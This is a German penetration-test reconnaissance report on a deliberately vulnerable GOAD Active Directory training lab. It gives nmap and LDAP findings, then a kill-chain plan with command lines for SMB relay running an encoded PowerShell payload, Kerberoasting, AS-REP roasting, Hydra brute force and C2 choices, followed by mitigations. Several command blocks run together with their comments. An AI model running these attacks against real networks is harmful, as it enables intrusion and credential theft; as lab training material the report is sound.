# Martin reconnaissance-report-extended

# Reconnaissance Phase Report - Erweiterte Analyse

## Executive Summary

Die detaillierte Analyse zeigt eine **GOAD (Game of Active Directory)** Lab-Umgebung mit drei separaten Active Directory-Domänen und einer pfSense-Firewall. Diese Umgebung ist bewusst mit verschiedenen Sicherheitslücken konfiguriert und bietet mehrere Angriffsvektoren für Penetrationstests.

---

## 1. Netzwerk-Topologie und erkannte Hosts

### 1.1 Aktive Hosts (basierend auf Ping-Sweep)

```
$ nmap -sn 192.168.20.0/24
```

| IP-Adresse | Status | Latenz | Rolle |
| --- | --- | --- | --- |
| 192.168.20.1 | Up | 34ms | pfSense Firewall |
| 192.168.20.10 | Up | 52ms | Domänencontroller (SEVENKINGDOMS) |
| 192.168.20.11 | Up | 47ms | Domänencontroller (NORTH) |
| 192.168.20.12 | Up | 67ms | Domänencontroller (ESSOS) |
| 192.168.20.22 | Up | 46ms | SQL Server (NORTH) |
| 192.168.20.23 | Up | 46ms | SQL Server (ESSOS) |

### 1.2 DNS-Auflösung

**Ergebnis:** Alle Reverse-DNS-Lookups schlagen fehl (`NXDOMAIN`), was auf eine unvollständige DNS-Konfiguration oder bewusste Verschleierung hindeutet.

---

## 2. Detaillierte Host-Analyse

### 2.1 pfSense Firewall (192.168.20.1)

**Betriebssystem:** FreeBSD 11.2-RELEASE (88% Wahrscheinlichkeit)

| Port | Service | Version | Details |
| --- | --- | --- | --- |
| 53 | DNS | Unbound | DNS-Server |
| 80 | HTTP | nginx | Weiterleitung zu HTTPS |
| 443 | HTTPS | nginx | pfSense Web GUI |

**Sicherheitsmerkmale:**
- TLS-Zertifikat für `vpn.goad.lab` (gültig bis 2034)
- TLS-ALPN-Unterstützung (h2, http/1.1, http/1.0, http/0.9)
- **Potenzielle Schwachstelle:** Standardkonfiguration könnte Angriffsvektoren bieten

---

### 2.2 KINGSLANDING (192.168.20.10) - Hauptdomänencontroller

**Domain:** `sevenkingdoms.local`

**Hostname:** `kingslanding.sevenkingdoms.local`

**OS:** Windows Server 2019

| Port | Service | Details |
| --- | --- | --- |
| 53 | DNS | Simple DNS Plus |
| 80 | HTTP | Microsoft IIS 10.0 (**TRACE aktiviert**) |
| 88 | Kerberos | Zeitserver: 2025-08-22 11:31:46Z |
| 135 | RPC | Microsoft Windows RPC |
| 139 | NetBIOS-SSN | Session Service |
| 389 | LDAP | AD LDAP (unverschlüsselt) |
| 445 | SMB | **Signierung erforderlich** |
| 464 | Kpasswd5 | Kerberos Password Change |
| 593 | RPC over HTTP | WinRM/PowerShell Remoting |
| 636 | LDAPS | Verschlüsselter LDAP |
| 3268 | Global Catalog | AD Global Catalog |
| 3269 | Global Catalog SSL | Verschlüsselter Global Catalog |
| 3389 | RDP | Terminal Services |
| 5985 | WinRM HTTP | PowerShell Remoting |
| 5986 | WinRM HTTPS | Verschlüsseltes PowerShell Remoting |

**Zertifikate:**
- LDAP/RDP: `kingslanding.sevenkingdoms.local` (gültig bis 2026-04-13)
- WinRM: `VAGRANT-2019` (gültig bis 2027-06-12)

---

### 2.3 WINTERFELL (192.168.20.11) - Child Domain Controller

**Domain:** `north.sevenkingdoms.local`

**Hostname:** `winterfell.north.sevenkingdoms.local`

**OS:** Windows Server 2019

**Port-Konfiguration:** Identisch mit KINGSLANDING, jedoch ohne HTTP (Port 80)

**Besonderheiten:**
- Child-Domain von `sevenkingdoms.local`
- SMB-Signierung **erforderlich**
- Zeitabweichung: -5 Sekunden

---

### 2.4 MEEREEN (192.168.20.12) - Separate Forest Domain Controller

**Domain:** `essos.local`

**Hostname:** `meereen.essos.local`

**OS:** Windows Server 2016 Standard Evaluation 14393

**Port-Konfiguration:** Ähnlich den anderen DCs, jedoch:
- **SMB-Signierung erforderlich**
- Guest-Account aktiviert für SMB-Zugriff
- Zeitabweichung: -6 Sekunden

**Startzeit:** 2025-08-13 14:05:32 (System läuft seit 9 Tagen)

---

### 2.5 CASTELBLACK (192.168.20.22) - SQL Server (NORTH Domain)

**Domain:** `north.sevenkingdoms.local`

**Hostname:** `castelblack.north.sevenkingdoms.local`

**OS:** Windows Server 2019

| Port | Service | Details |
| --- | --- | --- |
| 80 | HTTP | IIS 10.0 (**TRACE aktiviert**) |
| 135 | RPC | Windows RPC |
| 139 | NetBIOS | Session Service |
| 445 | SMB | **Signierung NICHT erforderlich** ⚠️ |
| 1433 | SQL Server | Microsoft SQL Server 2019 RTM |
| 3389 | RDP | Terminal Services |
| 5985 | WinRM HTTP | PowerShell Remoting |
| 5986 | WinRM HTTPS | Verschlüsseltes PowerShell Remoting |

**Kritische Sicherheitslücken:**
- SMB-Signierung deaktiviert (Relay-Angriffe möglich)
- SQL Server mit selbst-signiertem Zertifikat
- HTTP TRACE-Methode aktiviert

---

### 2.6 BRAAVOS (192.168.20.23) - SQL Server (ESSOS Domain)

**Domain:** `essos.local`

**Hostname:** `braavos.essos.local`

**OS:** Windows Server 2016 Standard Evaluation 14393

**Port-Konfiguration:** Ähnlich CASTELBLACK

**Kritische Sicherheitslücken:**
- **SMB-Signierung komplett deaktiviert** ⚠️ (gefährlich!)
- Guest-Account für SMB aktiviert
- SQL Server 2019 mit schwacher Konfiguration
- Zeitabweichung: -6 Sekunden

**Startzeit:** 2025-08-13 14:05:07

---

## 3. LDAP-Enumeration Ergebnisse

### 3.1 Erfolgreiche Anonymous LDAP-Abfragen

**KINGSLANDING (192.168.20.10):**

```
namingcontexts: DC=sevenkingdoms,DC=local
namingcontexts: CN=Configuration,DC=sevenkingdoms,DC=local
namingcontexts: CN=Schema,CN=Configuration,DC=sevenkingdoms,DC=local
namingcontexts: DC=DomainDnsZones,DC=sevenkingdoms,DC=local
namingcontexts: DC=ForestDnsZones,DC=sevenkingdoms,DC=local
```

**WINTERFELL (192.168.20.11):**

```
namingcontexts: CN=Configuration,DC=sevenkingdoms,DC=local
namingcontexts: CN=Schema,CN=Configuration,DC=sevenkingdoms,DC=local
namingcontexts: DC=north,DC=sevenkingdoms,DC=local
namingcontexts: DC=ForestDnsZones,DC=sevenkingdoms,DC=local
namingcontexts: DC=DomainDnsZones,DC=north,DC=sevenkingdoms,DC=local
```

**MEEREEN (192.168.20.12):**

```
namingContexts: DC=essos,DC=local
namingContexts: CN=Configuration,DC=essos,DC=local
namingContexts: CN=Schema,CN=Configuration,DC=essos,DC=local
namingContexts: DC=DomainDnsZones,DC=essos,DC=local
namingContexts: DC=ForestDnsZones,DC=essos,DC=local
```

### 3.2 Gescheiterte LDAP-Verbindungen

**CASTELBLACK & BRAAVOS (192.168.20.22/23):**

```
ldap_sasl_bind(SIMPLE): Can't contact LDAP server (-1)
```

→ Kein LDAP-Dienst aktiv (nur SQL Server-Hosts)

### 3.3 Authentifizierte LDAP-Abfragen scheitern

**Fehlermeldung für User-/Computer-Enumeration:**

```
result: 1 Operations error
text: 000004DC: LdapErr: DSID-0C090A37, comment: In order to perform this operation a successful bind must be completed on the connection.
```

**Bedeutung:** Anonymous Bind funktioniert für Basis-Informationen, aber detaillierte Enumeration erfordert Authentifizierung.

---

## 4. Identifizierte Schwachstellen und Sicherheitsrisiken

### 4.1 Kritische Schwachstellen (High Risk)

1. **SMB-Signierung deaktiviert** (CASTELBLACK, BRAAVOS)
    - **Risiko:** SMB Relay-Angriffe, NTLM-Hash-Capture
    - **Ausnutzung:** Responder, ntlmrelayx
2. **HTTP TRACE aktiviert** (KINGSLANDING, CASTELBLACK, BRAAVOS)
    - **Risiko:** Cross-Site Tracing (XST)
    - **Ausnutzung:** Session Hijacking, Credential Theft
3. **SQL Server mit schwacher Konfiguration**
    - **Risiko:** Privilege Escalation, Remote Code Execution
    - **Ausnutzung:** SQL Injection, xp_cmdshell

### 4.2 Mittlere Schwachstellen (Medium Risk)

1. **Anonymous LDAP-Bind möglich**
    - **Risiko:** Domain-Enumeration
    - **Ausnutzung:** Benutzer-/Gruppen-Enumeration
2. **Selbst-signierte Zertifikate**
    - **Risiko:** Man-in-the-Middle-Angriffe
    - **Ausnutzung:** Certificate Spoofing
3. **Standard-Vagrant-Zertifikate**
    - **Risiko:** Bekannte private Schlüssel
    - **Ausnutzung:** Traffic-Entschlüsselung

### 4.3 Niedrige Schwachstellen (Low Risk)

1. **Zeitabweichungen zwischen Systemen**
    - **Risiko:** Kerberos-Authentifizierungsprobleme
    - **Ausnutzung:** Ticket-Replay-Angriffe
2. **Guest-Account aktiviert**
    - **Risiko:** Unauthorized Access
    - **Ausnutzung:** Credential Brute-Force

---

## 5. Active Directory-Architektur

### 5.1 Forest-/Domain-Struktur

```
FOREST: sevenkingdoms.local
├── ROOT DOMAIN: sevenkingdoms.local (192.168.20.10)
└── CHILD DOMAIN: north.sevenkingdoms.local (192.168.20.11)
    └── MEMBER SERVER: castelblack.north.sevenkingdoms.local (192.168.20.22)

FOREST: essos.local
├── ROOT DOMAIN: essos.local (192.168.20.12)
└── MEMBER SERVER: braavos.essos.local (192.168.20.23)
```

### 5.2 Trust-Beziehungen

**Vermutung:** Bidirektionale Forest-Trusts zwischen `sevenkingdoms.local` und `essos.local` (typisch für GOAD-Lab)

---

## 6. Nächste Schritte in der Cyber Kill Chain

### Phase 2: Weaponization & Delivery

### 6.1 Sofortige Angriffsmöglichkeiten

**SMB Relay-Angriffe:**

```bash
# Responder für NTLM-Captureresponder -I eth0 -rdwv# ntlmrelayx gegen CASTELBLACK/BRAAVOSntlmrelayx.py -tf targets.txt -smb2support -c "powershell.exe -enc <base64_payload>"
```

**Kerberos-Angriffe:**

```bash
# Kerberoasting (falls Service Accounts existieren)GetUserSPNs.py sevenkingdoms.local/user:password -dc-ip 192.168.20.10
# ASREPRoasting (für Benutzer ohne Pre-Auth)GetNPUsers.py sevenkingdoms.local/ -dc-ip 192.168.20.10 -usersfile users.txt
```

### 6.2 Web-Application-Testing

**IIS-Schwachstellen-Tests:**

```bash
# Directory Enumerationdirb http://192.168.20.10/ /usr/share/dirb/wordlists/common.txt
# HTTP Methods Testingnmap --script http-methods 192.168.20.10
```

**SQL Server-Angriffe:**

```bash
# SQL Server Enumerationnmap --script ms-sql-info 192.168.20.22,192.168.20.23
# Authentication Bypassmssqlclient.py -port 1433 192.168.20.22
```

### Phase 3: Exploitation

### 6.1 Initiale Kompromittierung

**Prioritäts-Targets:**
1. **CASTELBLACK** (192.168.20.22) - Schwächster SMB-Host
2. **BRAAVOS** (192.168.20.23) - Deaktivierte SMB-Signierung
3. **pfSense** (192.168.20.1) - Potenzielle CVEs

### 6.2 Credential Harvesting

**LDAP-Brute-Force:**

```bash
# Hydra gegen LDAPhydra -L users.txt -P passwords.txt ldap://192.168.20.10
# Custom LDAP Brute-Forceldapsearch -x -H ldap://192.168.20.10 -D "CN=user,DC=sevenkingdoms,DC=local" -w password
```

### Phase 4: Installation & Persistence

### 4.1 Post-Exploitation Tools

**Empire/Covenant C2:**
- PowerShell-basierte Implants
- WMI/WinRM für Lateral Movement

**Golden/Silver Tickets:**
- Nach Kompromittierung der DCs
- Krbtgt-Hash-Extraktion

### Phase 5: Command & Control

**Empfohlene C2-Kanäle:**
1. **HTTPS über pfSense** (Port 443)
2. **WinRM** (Ports 5985/5986)
3. **RDP-Tunneling** (Port 3389)

### Phase 6: Actions on Objectives

### 6.1 Lateral Movement

**Pivoting-Strategien:**

```
Attacker → pfSense (192.168.20.1) → Domain Controllers
Attacker → CASTELBLACK → WINTERFELL → KINGSLANDING
```

### 6.2 Privilege Escalation

**Domain Admin-Paths:**
1. **Kerberoasting** → Service Account → Domain Admin
2. **SMB Relay** → Computer Account → DCSync
3. **SQL Server** → xp_cmdshell → Local System

---

## 7. Recommended Mitigation Strategies

### 7.1 Sofort-Maßnahmen

1. **SMB-Signierung aktivieren** auf allen Hosts
2. **HTTP TRACE deaktivieren** in IIS-Konfiguration
3. **Anonymous LDAP-Bind blockieren**
4. **Standard-Zertifikate ersetzen**

### 7.2 Langfristige Härtung

1. **Network Segmentation** zwischen Domänen
2. **Privileged Access Management** (PAM)
3. **Enhanced Monitoring** für Kerberos/LDAP
4. **Application Whitelisting** auf kritischen Servern

---

## 8. Fazit

Die GOAD-Umgebung bietet **exzellente Angriffsmöglichkeiten** für Penetrationstesting und Training. Die Kombination aus schwacher SMB-Konfiguration, aktivierter HTTP TRACE und Anonymous LDAP macht diese Umgebung besonders vulnerabel.

**Nächster empfohlener Schritt:** Beginn mit **SMB Relay-Angriffen** gegen CASTELBLACK (192.168.20.22) als Einstiegspunkt in die NORTH-Domain.

---

*Erstellt am: 26. August 2025*

*Tool-Version: Nmap 7.95*

*Umgebung: GOAD (Game of Active Directory) Lab*

[goad_vulnerability_analysis](goad_vulnerability_analysis%2025bd16330f2f80b89847ce82f3c7c352.csv)

[goad_host_analysis](goad_host_analysis%2025bd16330f2f8000bc63f2ec0cf3d967.csv)